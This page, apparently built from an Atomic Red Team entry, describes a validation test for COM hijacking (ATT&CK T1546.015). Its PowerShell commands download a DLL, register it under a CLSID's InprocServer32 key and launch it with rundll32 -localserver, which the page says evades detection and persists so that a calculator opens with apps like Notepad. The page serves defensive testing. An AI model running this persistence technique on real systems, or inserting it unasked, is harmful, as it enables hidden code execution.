---
atomic_guid: "123520cc-e998-471b-a920-bd28e3feafa0"
title: "COM Hijacking with RunDLL32 (Local Server Switch)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.015"
attack_technique_name: "Event Triggered Execution: Component Object Model Hijacking"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "123520cc-e998-471b-a920-bd28e3feafa0"
  - "COM Hijacking with RunDLL32 (Local Server Switch)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# COM Hijacking with RunDLL32 (Local Server Switch)

This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via "rundll32.exe -localserver [clsid]". 
This method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. 
Reference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/
Upon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened.

## Metadata

- Atomic GUID: 123520cc-e998-471b-a920-bd28e3feafa0
- Technique: T1546.015: Event Triggered Execution: Component Object Model Hijacking
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1546.015/T1546.015.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.015]]

## Input Arguments

### clsid

- description: Class ID to hijack.
- type: string
- default: {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}

### clsid_description

- description: Description for CLSID
- type: string
- default: MSAA AccPropServices

### clsid_threading

- description: Threading Model
- type: string
- default: Both

### dll_path

- description: Path to the DLL.
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll

## Dependencies

DLL For testing

### Prerequisite Check

```text
if (Test-Path "#{dll_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll" -OutFile "#{dll_path}"
```

## Executor

- name: powershell

### Command

```powershell
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dll_path}"
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver #{clsid}'
```

### Cleanup

```powershell
Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.yaml)
